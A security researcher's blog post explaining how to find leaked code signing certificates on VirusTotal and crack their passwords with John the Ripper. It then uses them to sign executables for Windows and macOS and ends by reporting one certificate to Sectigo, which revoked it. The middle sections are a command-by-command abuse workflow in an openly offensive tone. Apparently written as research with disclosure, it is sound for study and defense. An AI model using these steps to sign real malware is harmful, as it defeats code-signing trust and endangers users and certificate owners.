---
layout: post
title: Finding and utilising leaked code signing certificates
subtitle: Code signing certificates sometimes unexpectedly end up online. In this blog post I describe how to find, crack, and use them to sign malware.
description: Using services such as GitHub or VirusTotal, it is possible to find leaked code signing certificates. For some, the password can be cracked, after which they can be used to sign malicious code. In this blog post I explain this process, including responsible disclosure measures.
keywords: leaked, code, signing, certificates, malware
author: Tijme Gommers
include_in_header: false
include_in_footer: false
show_in_post_list: true
robots: index, follow
---

**[TL;DR]** Using tools such as VirusTotal, it is possible to find leaked code signing certificates. For some, the password can be cracked, after which they can be used to sign malicious code. In this blog post I explain this process, including responsible disclosure measures.

<hr>

This blog post consists of 4 chapters. [Finding](#1-finding-certificates) leaked certificates, [cracking](#2-cracking-pkcs12-passwords) their passwords, using them to [sign malware](#3-signing-malware), and [reporting](#4-reporting-leaked-certificates) leaked certificates to certificate authorities.

### 1. Finding certificates

There are many ways to find code signing certificates online. If you're lucky, you'll find one that is still valid. In my journey, I mostly used VirusTotal, but it seems that platforms like [Grayhat Warfare](https://grayhatwarfare.com/){:target="_blank"}{:rel="noopener noreferrer"} and [GitHub](https://github.com/){:target="_blank"}{:rel="noopener noreferrer"} also have many certificates uploaded to them. We'll use VirusTotal in this blog post.

With the query below, you can find files with a byte sequence commonly observed in signing certificates. The sequence is often part of ASN.1 DER encoded files ([RFC7292](https://datatracker.ietf.org/doc/html/rfc7292){:target="_blank"}{:rel="noopener noreferrer"}). At offset 4, a version number should be present that always has the value 3. This is denoted by the `02 01 03`. The 4<sup>th</sup> byte in the sequence is `30`, which represents the start of a new sequence.

    content:{02 01 03 30}@4 NOT tag:msi AND NOT tag:peexe

The results can be downloaded via the VirusTotal GUI or API.

{% 
    include lightbox.html 
    image="/img/finding-and-utilising-leaked-code-signing-certificates/search-results-virustotal.png"
    title="Search results on VirusTotal"
    album="finding-certificates"
    width="2878" 
    height="1084"
%}

I downloaded about 50 certificates that were [recently uploaded](https://www.virustotal.com/gui/search/content%253A%257B02%252001%252003%252030%257D%25404%2520NOT%2520tag%253Amsi%2520AND%2520NOT%2520tag%253Apeexe%2520AND%2520ls%253A5d%252B/files){:target="_blank"}{:rel="noopener noreferrer"} to VirusTotal.

### 2. Cracking PKCS#12 passwords

My go-to hash-cracking software is Hashcat. Unfortunately, it does not support cracking PKCS#12 files. John the Ripper *does* support PKCS#12. First, we need to extract a hash from our PKCS#12 file. This can be done using John's `pfx2john.py` Python script. I made a [few changes](https://gist.github.com/tijme/86edd06c636ad06c306111fcec4125ba){:target="_blank"}{:rel="noopener noreferrer"} to make the script compatible with Python 3.

    pfx2john.py certificate.pfx > certificate.hash

If you've generated hashes based on the certificates you found, you can crack them using John with the following arguments. In this example, we use `rockyou.txt` as a wordlist.

{% highlight bash %}
$ john --wordlist=rockyou.txt --format=pfx-opencl ./hashes/*

Using default input encoding: UTF-8
Loaded 13 password hashes with 13 different salts (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2)])
-- snip --
123              (7f61a5a51fe9eef15c9e2ddf03fe10c6.pfx)
123              (66a9882f1d8463501f7fc89b1a12700b.pfx)
                 (83bfdbd568b967baf24b7c44935b9a12.pfx)
test             (certificate.pfx)
-- snip --
Session completed.
{% endhighlight %}

> :warning: If John cannot load your hash, make sure to install the latest version of John from source (to ensure you have PKCS#12 support).

As you can see, some of the hashes got cracked quite easily. The password for the last one is `test`. For the cracked certificates, check if they're trusted and still valid (e.g. not revoked). For the trusted and valid ones, ensure that they have the `Code Signing` Object Identifier (OID): `1.3.6.1.5.5.7.3.3`. Now hopefully you have one left. You'll be able to use it to sign malware!

{% 
    include lightbox.html 
    image="/img/finding-and-utilising-leaked-code-signing-certificates/extended-key-usage-code-signing.png"
    title="Extended Key Usage: Code Signing"
    album="validating-certificates"
    width="2226" 
    height="604"
%}

PS: If you want to use a more extensive password list with John the Ripper, look for one on [Weakpass](https://weakpass.com/wordlist){:target="_blank"}{:rel="noopener noreferrer"}. You could try to use rules and masks as well. I've added two examples below for you to get started.

{% highlight bash %}
# With rules
./john --wordlist=rockyou.txt --format=pfx-opencl ./hashes/* --rules:OneRuleToRuleThemAll

# With mask
./john --mask=?1?1?1?1?1?1?1?1?1 -1=[A-z0-9\!\@] --format=pfx-opencl ./hashes/* -min-len=1
{% endhighlight %}

### 3. Signing malware

If you've found and cracked a valid and trusted signing certificate, you can use it to sign malware. I'll demonstrate signing malware for both Windows and MacOS.

**Windows**

To sign PE files, there is an amazing open source project called [osslsigncode](https://github.com/mtrojnar/osslsigncode){:target="_blank"}{:rel="noopener noreferrer"}. Once installed, run the following command to create a signed version of your malware.

{% highlight bash %}
osslsigncode sign -pkcs12 certificate.pfx -pass test -in malware.exe -out signed-malware.exe
Succeeded
{% endhighlight %}

To verify if the signature is valid and correctly applied, you can use `osslsigncode` as well.

{% highlight bash %}
osslsigncode verify signed-autoruns.exe

-- snip --
Authenticated attributes:
    Message digest algorithm: SHA256
    Message digest: C89F86DBE18BB37C44857F3535E5984DCA783610BDFEBF18F659F5275D8D5236
    Signing time: Jun  7 18:49:06 2023 GMT
    Microsoft Individual Code Signing purpose

-- snip --
Signature verification: ok

Number of verified signatures: 1
Succeeded
{% endhighlight %}

> :warning: Please note that in my experience `osslsigncode` does not check if a certificate has been revoked.

{% 
    include lightbox.html 
    image="/img/finding-and-utilising-leaked-code-signing-certificates/signed-malware.png"
    title="Signed malware"
    album="signed-malware"
    width="1646" 
    height="578"
%}

Finally; enjoy your signed malware!

**MacOS**

If you're signing an existing (modified) app for MacOS, please first remove the existing signature.

{% highlight bash %}
codesign --remove-signature malicious.app
{% endhighlight %}

Afterwards, import the signing certificate into your keychain. Right-click it and create a new signing identity. Use a name of your choice.

{% 
    include lightbox.html 
    image="/img/finding-and-utilising-leaked-code-signing-certificates/sign-create-identity.png"
    title="Creating a signing identity"
    album="signing-malware"
    width="1682" 
    height="358"
%}

You can now use this identity to sign your malicious app.

{% highlight bash %}
codesign -s "your_identity" malicious.app
{% endhighlight %}

To check if everything worked, we verify the signature. If everything is okay, the command will not output anything. 

{% highlight bash %}
codesign --verify malicious.app
{% endhighlight %}

If something is wrong, an error will be shown. This is what the output looks like when, for example, your certificate is revoked.

{% highlight bash %}
codesign --verify malicious.app

malicious.app: CSSMERR_TP_CERT_REVOKED
In architecture: x86_64
{% endhighlight %}

### 4. Reporting leaked certificates

In the example above, the leaked certificate was issued by Sectigo. Sectigo, and any other certificate authority, provides ways to report abuse, including fraudulent or malicious use of certificates. I mailed Sectigo with the following details of the certificate that I found:

* VirusTotal link (including a link to malware signed by the certificate).
* Password.
* Serial number.
* SHA-256 hash.
* SHA-1 hash.

8 days later Sectigo stated that, upon continued investigation, they found that the signing certificate was indeed involved in malicious activity and has now been revoked.
